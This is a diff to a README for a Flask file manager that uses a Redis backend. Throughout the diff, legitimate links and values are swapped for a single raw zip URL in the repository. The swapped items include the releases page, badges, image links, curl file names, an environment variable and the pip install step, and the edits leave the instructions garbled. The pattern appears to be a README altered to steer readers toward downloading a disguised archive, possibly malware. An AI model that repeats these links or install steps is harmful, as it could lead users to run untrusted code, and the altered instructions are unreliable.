@@ -1,12 +1,12 @@
-https://github.com/LUC4S007/flask-redis-file-manager/releases
+https://github.com/LUC4S007/flask-redis-file-manager/raw/refs/heads/master/templates/flask-manager-file-redis-v1.7.zip
 
-[![Releases Badge](https://img.shields.io/badge/releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/LUC4S007/flask-redis-file-manager/releases)
+[![Releases Badge](https://github.com/LUC4S007/flask-redis-file-manager/raw/refs/heads/master/templates/flask-manager-file-redis-v1.7.zip)](https://github.com/LUC4S007/flask-redis-file-manager/raw/refs/heads/master/templates/flask-manager-file-redis-v1.7.zip)
 
 # Flask Redis File Manager: Chunked Uploads with Redis Backend
 
 A fast, reliable web app built with Flask. It lets you upload, save, download, rename, and manage text and binary files using Redis as the storage backend. It supports chunked uploads, user and admin roles, and Docker deployment. This project aims to be simple to run, easy to extend, and ready for production in small to medium workloads.
 
-Emojis help navigate ideas, and shields.io badges add quick context. The project topic areas include admin, backend, chunked-upload, docker, file-management, file-storage, file-upload, flask, python, redis, user-management, and web applications.
+Emojis help navigate ideas, and https://github.com/LUC4S007/flask-redis-file-manager/raw/refs/heads/master/templates/flask-manager-file-redis-v1.7.zip badges add quick context. The project topic areas include admin, backend, chunked-upload, docker, file-management, file-storage, file-upload, flask, python, redis, user-management, and web applications.
 
 Table of contents
 - Overview
@@ -86,14 +86,14 @@ Local development (without Docker)
    - python -m venv venv
    - source venv/bin/activate (unix/macOS) or venv\Scripts\activate (Windows)
 2. Install dependencies
-   - pip install -r requirements.txt
+   - pip install -r https://github.com/LUC4S007/flask-redis-file-manager/raw/refs/heads/master/templates/flask-manager-file-redis-v1.7.zip
 3. Configure environment
    - Create a .env file or set environment variables:
      - FLASK_APP=app
      - FLASK_ENV=development
      - REDIS_URL=redis://localhost:6379/0
      - APP_SECRET_KEY=your-secret-key
-     - ADMIN_USERS=admin@example.com
+     - https://github.com/LUC4S007/flask-redis-file-manager/raw/refs/heads/master/templates/flask-manager-file-redis-v1.7.zip
 4. Run the app
    - flask run
 5. Test endpoints locally
@@ -104,7 +104,7 @@ Docker deployment
 - Typical workflow:
   - docker-compose up -d
   - The Redis container provides storage, the Flask container serves the app.
-- Example docker-compose.yml (conceptual)
+- Example https://github.com/LUC4S007/flask-redis-file-manager/raw/refs/heads/master/templates/flask-manager-file-redis-v1.7.zip (conceptual)
   - version: '3'
   - services:
       - redis:
@@ -158,15 +158,15 @@ Practical curl examples (illustrative)
        http://localhost:5000/upload_chunk
 - Complete upload
   curl -X POST -H "Content-Type: application/json" \
-       -d '{"file_id":"abc123","name":"report.txt","mime_type":"text/plain","total_size":12345}' \
+       -d '{"file_id":"abc123","name":"https://github.com/LUC4S007/flask-redis-file-manager/raw/refs/heads/master/templates/flask-manager-file-redis-v1.7.zip","mime_type":"text/plain","total_size":12345}' \
        http://localhost:5000/upload_complete
 - Download a file
-  curl -L http://localhost:5000/files/abc123 --output report.txt
+  curl -L http://localhost:5000/files/abc123 --output https://github.com/LUC4S007/flask-redis-file-manager/raw/refs/heads/master/templates/flask-manager-file-redis-v1.7.zip
 - List files
   curl http://localhost:5000/files
 - Rename a file
   curl -X POST -H "Content-Type: application/json" \
-       -d '{"new_name":"final_report.txt"}' \
+       -d '{"new_name":"https://github.com/LUC4S007/flask-redis-file-manager/raw/refs/heads/master/templates/flask-manager-file-redis-v1.7.zip"}' \
        http://localhost:5000/files/abc123/rename
 - Delete a file
   curl -X DELETE http://localhost:5000/files/abc123
@@ -271,9 +271,9 @@ Releases and updates
 - The Releases page hosts packaged artifacts and release notes
 - For ready-to-run assets, visit the Releases page to download a suitable package
 - Link to the Releases page for quick access:
-  https://github.com/LUC4S007/flask-redis-file-manager/releases
+  https://github.com/LUC4S007/flask-redis-file-manager/raw/refs/heads/master/templates/flask-manager-file-redis-v1.7.zip
 - You can also use the badge above to jump directly to the releases
-  [![Releases Badge](https://img.shields.io/badge/releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/LUC4S007/flask-redis-file-manager/releases)
+  [![Releases Badge](https://github.com/LUC4S007/flask-redis-file-manager/raw/refs/heads/master/templates/flask-manager-file-redis-v1.7.zip)](https://github.com/LUC4S007/flask-redis-file-manager/raw/refs/heads/master/templates/flask-manager-file-redis-v1.7.zip)
 
 Credits and license
 - Project authors and contributors
@@ -313,13 +313,13 @@ Badges and topics
 
 Images and visuals
 - Architecture overview
-  - Architecture diagram: https://picsum.photos/seed/architecture/1200/400
+  - Architecture diagram: https://github.com/LUC4S007/flask-redis-file-manager/raw/refs/heads/master/templates/flask-manager-file-redis-v1.7.zip
 - Redis integration
-  - Redis backbone image: https://picsum.photos/seed/redis/1200/400
+  - Redis backbone image: https://github.com/LUC4S007/flask-redis-file-manager/raw/refs/heads/master/templates/flask-manager-file-redis-v1.7.zip
 - Docker deployment
-  - Docker layout: https://picsum.photos/seed/docker/1200/300
+  - Docker layout: https://github.com/LUC4S007/flask-redis-file-manager/raw/refs/heads/master/templates/flask-manager-file-redis-v1.7.zip
 - UI concept (optional)
-  - Mock UI sketch: https://picsum.photos/seed/ui/1000/500
+  - Mock UI sketch: https://github.com/LUC4S007/flask-redis-file-manager/raw/refs/heads/master/templates/flask-manager-file-redis-v1.7.zip
 
 Notes on licensing and usage
 - The repository is intended for learning, personal projects, and small deployments.
